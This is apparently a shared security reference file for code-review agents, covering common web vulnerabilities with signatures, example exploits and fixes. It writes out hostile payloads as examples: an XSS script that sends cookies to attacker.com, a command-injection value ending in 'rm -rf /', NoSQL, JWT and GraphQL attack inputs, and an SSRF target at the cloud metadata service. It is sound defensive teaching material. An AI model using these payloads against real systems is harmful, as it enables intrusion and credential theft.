---
name: warden-security-intelligence
description: Canonical Security Intelligence reference for warden agents. Not an agent — a shared reference file. Update here, then paste into all three warden agents.
---

## Security Intelligence

### Tier 1 — OWASP Core (always check)

**SQL Injection**
- Signature: String-concatenated queries, template literals with user input in SQL strings
- Exploit: `"SELECT * FROM users WHERE id = " + req.params.id` — attacker passes `1 OR 1=1` to dump table
- Fix: Parameterized queries only — `db.query("SELECT * FROM users WHERE id = $1", [req.params.id])`

**NoSQL Injection**
- Signature: MongoDB/similar queries accepting object shapes directly from req.body without sanitization
- Exploit: `User.find({ email: req.body.email })` — attacker sends `{ "email": { "$gt": "" } }` to match all records
- Fix: Validate/sanitize object shapes before query; use schema validation (Zod/Joi) at the boundary

**Command Injection**
- Signature: `exec()`, `spawn()`, `child_process` calls where any argument derives from user input
- Exploit: `exec("convert " + req.body.filename)` — attacker passes `image.jpg; rm -rf /`
- Fix: Avoid shell execution; if unavoidable use `execFile` with argument array (no shell interpolation); whitelist allowed values

**XSS (Stored/Reflected)**
- Signature: `innerHTML`, `dangerouslySetInnerHTML`, `document.write`, `element.outerHTML` set with user data
- Exploit: Stored comment containing `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`
- Fix: Encode output (DOMPurify for HTML, `textContent` not `innerHTML`); set `Content-Security-Policy: script-src 'self'`

**XSS (DOM-based)**
- Signature: `location.hash`, `URLSearchParams.get()`, `document.referrer` feeding into DOM manipulation
- Exploit: `document.getElementById('msg').innerHTML = location.hash.slice(1)` — attacker links to `page#<img src=x onerror=alert(1)>`
- Fix: Treat all URL-derived data as untrusted; sanitize before DOM insertion; use `textContent` not `innerHTML`

**Broken Authentication / JWT**
- Signature: JWT `alg` read from token header; weak/hardcoded secret; missing `exp` check; session not invalidated on logout
- Exploit (alg:none): Attacker removes signature and sets `alg: none` — server skips verification
- Exploit (HS256/RS256 confusion): Server uses RS256; attacker switches to HS256 and signs with public key as HMAC secret
- Fix: Hardcode algorithm in verification (`{ algorithms: ['RS256'] }`); ≥256-bit secret from env; verify `exp`; maintain server-side token blocklist for logout

**IDOR / Broken Access Control**
- Signature: `WHERE id = req.params.id` or `findById(req.params.id)` without checking ownership
- Exploit: Authenticated user changes `GET /api/invoices/1234` to `GET /api/invoices/5678` — sees another user's invoice
- Fix: Always scope to authenticated user: `WHERE id = $1 AND owner_id = $2` with `[req.params.id, req.user.id]`

**Path Traversal**
- Signature: `fs.readFile(basePath + req.params.file)` or `path.join(dir, userInput)` without validation
- Exploit: `GET /files?name=../../etc/passwd` — `path.join('/uploads', '../../etc/passwd')` = `/etc/passwd`
- Fix: Append `path.sep` to base dir before the `startsWith` check — without it, `/app/uploads-evil/file` passes `startsWith('/app/uploads')`:
```javascript
const BASE = path.resolve('/app/uploads') + path.sep;
const resolved = path.resolve(BASE, req.params.file);
if (!resolved.startsWith(BASE)) throw new Error('forbidden');
```

**Mass Assignment**
- Signature: `Object.assign(record, req.body)`, `Model.create(req.body)`, spreading request body into ORM update
- Exploit: User sends `{ "name": "Alice", "isAdmin": true }` — isAdmin gets written to DB
- Fix: Explicit allowlist: `const { name, email } = req.body; Model.update({ name, email }, { where: { id } })`

**Insecure Deserialization**
- Signature: `JSON.parse` on untrusted input fed to `eval`; YAML/pickle deserialization with user-supplied data
- Exploit: `eval(JSON.parse(req.body.config))` — attacker sends `{"__proto__": ...}` or code string
- Fix: Validate schema after parse (Zod/Joi); never eval deserialized content; use safe YAML loader

**Security Misconfiguration**
- Signature: Stack traces in error responses; debug endpoints without env guard; default credentials in config
- Exploit: Error response leaks `at Object.<anonymous> (/app/src/db/queries.js:45:12)` — reveals file structure and query logic
- Fix: Generic error messages in production: `res.status(500).json({ error: 'Internal server error' })`; gate debug routes on `NODE_ENV !== 'production'`

**Sensitive Data Exposure**
- Signature: Passwords/tokens in `console.log`; API keys in client-side bundle; PII in GET query params (logged by proxies)
- Exploit: `console.log('User login:', { email, password })` — password appears in log aggregation tooling
- Fix: Never log credentials; scrub sensitive fields before logging; use POST for sensitive data; audit client bundles with `webpack-bundle-analyzer`

---

### Tier 2 — Advanced / Full-Stack Vectors (always check on authenticated surfaces)

**SSRF (Server-Side Request Forgery)**
- Exploit: User-controlled URL passed to server-side HTTP client. Attacker targets `http://169.254.169.254/latest/meta-data/` (AWS metadata), internal services at `http://internal-db:5432`, or `http://localhost:8080/admin`.
- Signature: `fetch(req.body.url)`, `axios.get(req.query.webhookUrl)`, `got(req.body.callback)` — any HTTP call where hostname/URL derives from user input
- Fix:
```javascript
import { URL } from 'url';
import dns from 'dns/promises';
const PRIVATE_RANGES = [/^10\./, /^172\.(1[6-9]|2\d|3[01])\./, /^192\.168\./, /^127\./, /^169\.254\./];
async function isSafeUrl(rawUrl) {
  const { hostname } = new URL(rawUrl);
  const { address } = await dns.lookup(hostname);
  return !PRIVATE_RANGES.some(r => r.test(address));
}
```

**JWT Algorithm Confusion**
- Exploit: Server configured for RS256 (asymmetric). Attacker obtains public key (often exposed at `/.well-known/jwks.json`), changes token header to `HS256`, and signs with the public key as the HMAC secret. Server verifies the HMAC using the public key — succeeds.
- Signature: `jwt.verify(token, publicKey)` without `{ algorithms: ['RS256'] }` option
- Fix: `jwt.verify(token, publicKey, { algorithms: ['RS256'] })` — never derive algorithm from token header

**JWT None Algorithm**
- Exploit: Some JWT libraries accept `alg: none` as a valid algorithm, skipping signature verification entirely. Attacker crafts `{"alg":"none","typ":"JWT"}` header with arbitrary payload and empty signature.
- Signature: Missing `algorithms` option in `jwt.verify()`; library version known to accept `none`
- Fix: `jwt.verify(token, secret, { algorithms: ['HS256'] })` — explicit allowlist that excludes `none`

**CSRF (Cross-Site Request Forgery)**
- Exploit: Victim is logged in to `app.com`. Attacker's page at `evil.com` contains a hidden form that POSTs to `app.com/transfer`. Browser includes session cookie automatically. No CSRF token = attack succeeds.
- Signature: Mutation endpoints (POST/PUT/DELETE/PATCH) authenticated via cookies only, no CSRF token, no `SameSite` cookie attribute, no `Origin` header check
- Fix: `Set-Cookie: session=...; SameSite=Strict; HttpOnly; Secure` — or add CSRF middleware using `csrf-csrf` (actively maintained; `csurf` is deprecated with open advisory GHSA-fjx2-phgx-3q4m):
```javascript
import { doubleCsrf } from 'csrf-csrf';
const { generateToken, doubleCsrfProtection } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET
});
app.use(doubleCsrfProtection);
```

**Prototype Pollution**
- Exploit: `_.merge({}, JSON.parse(req.body))` where body is `{"__proto__": {"isAdmin": true}}`. Pollutes `Object.prototype` — every subsequent `{}.isAdmin` returns `true` in the same process.
- Signature: `_.merge`, `deepmerge`, recursive spread, or any deep-merge where source is user-supplied
- Fix:
```javascript
function sanitizeKeys(obj) {
  if (typeof obj !== 'object' || obj === null) return obj;
  const safe = Object.create(null);
  for (const [k, v] of Object.entries(obj)) {
    if (['__proto__', 'constructor', 'prototype'].includes(k)) continue;
    safe[k] = sanitizeKeys(v);
  }
  return safe;
}
const safeBody = sanitizeKeys(req.body);
```

**Race Condition / TOCTOU (Time-of-Check Time-of-Use)**
- Exploit: `if (user.balance >= amount) { await deductBalance(amount) }`. Two concurrent requests both read balance = 100, both pass the check for amount = 80, both deduct — balance goes to -60.
- Signature: Read-then-write on shared mutable state (balance, inventory count, rate limit counter, seat reservation) without database-level atomicity
- Fix (PostgreSQL): `UPDATE accounts SET balance = balance - $1 WHERE id = $2 AND balance >= $1 RETURNING balance` — atomic check-and-act, returns nothing if insufficient

**ReDoS (Regular Expression Denial of Service)**
- Exploit: Input `aaaaaaaaaaaaaaaaaaaaaaaaaaab` fed to `/(a+)+$/` triggers catastrophic backtracking — O(2^n) time, blocks Node.js event loop for seconds.
- Signature: `userInput.match(/pattern/)` or `regex.test(userInput)` where pattern has nested quantifiers (`(a+)+`, `(a|a)*`, `(a*)*`)
- Fix: Run regexes through a ReDoS checker (use `safe-regex` or `redos-detector`); replace problematic patterns with linear alternatives; set timeout via worker thread if pattern is complex

**GraphQL-Specific Attacks**
- Exploit (Introspection): `{ __schema { types { name fields { name } } } }` — maps entire API surface, finds hidden/internal fields
- Exploit (Depth): `{ user { friends { friends { friends { ... } } } } }` — 20 levels deep, triggers N+1 and memory exhaustion
- Exploit (Batching): `[{"query":"mutation { deleteUser(id:1)"},{"query":"mutation { deleteUser(id:2)"}...]` — 1000 mutations bypass per-request rate limit
- Fix: Disable introspection: `introspection: process.env.NODE_ENV === 'development'`; add depth limit plugin (graphql-depth-limit, max 7); complexity scoring (graphql-query-complexity); per-query rate limiting separate from HTTP rate limiting

**Open Redirect**
- Exploit: `res.redirect(req.query.returnTo)` — attacker sends `?returnTo=https://evil.com/phishing` in password reset email link. User clicks legitimate-looking domain, lands on attacker site.
- Signature: `res.redirect(req.query.*)`, `res.redirect(req.body.*)` — any redirect where destination derives from user input
- Fix:
```javascript
const ALLOWED_PATHS = /^\/[a-z0-9\-/_]+$/i;
const returnTo = req.query.returnTo;
if (!returnTo || !ALLOWED_PATHS.test(returnTo)) return res.redirect('/dashboard');
res.redirect(returnTo);
```

**Clickjacking**
- Exploit: Attacker embeds `<iframe src="https://app.com/settings/delete-account">` in their page. Overlays transparent UI. User thinks they're clicking attacker's button — actually clicks "Delete Account" in the iframe.
- Signature: Missing `X-Frame-Options` header; missing `frame-ancestors` directive in Content-Security-Policy
- Fix: Add to all responses: `res.setHeader('X-Frame-Options', 'DENY')` and `Content-Security-Policy: frame-ancestors 'none'`

**Supply Chain**
- Exploit: `npm install` pulls in `lodash` typosquatted as `loadsh` (malicious). Or legitimate dependency version with unpatched CVE (e.g., log4shell-style RCE via transitive dep).
- Signature: New dependency added without `npm audit`; `*` or `latest` version range; package name resembles popular package but has low download count
- Fix: Run `npm audit --audit-level=high` in CI; pin exact versions for security-critical deps in package.json; review new package publisher and download count before adding

---

### Finding Reporting Standard

Every security finding **must** include all three components. A finding missing any component is incomplete — do not raise it.

1. **Vector class** — name the specific attack (e.g., "SSRF", "JWT Algorithm Confusion", "Prototype Pollution")
2. **Exploit path** — trace the exact code path (`file:line → file:line`), identify what the attacker controls, what they reach, and what the impact is
3. **Hardened replacement** — the fixed code inline, not a prose description of the fix
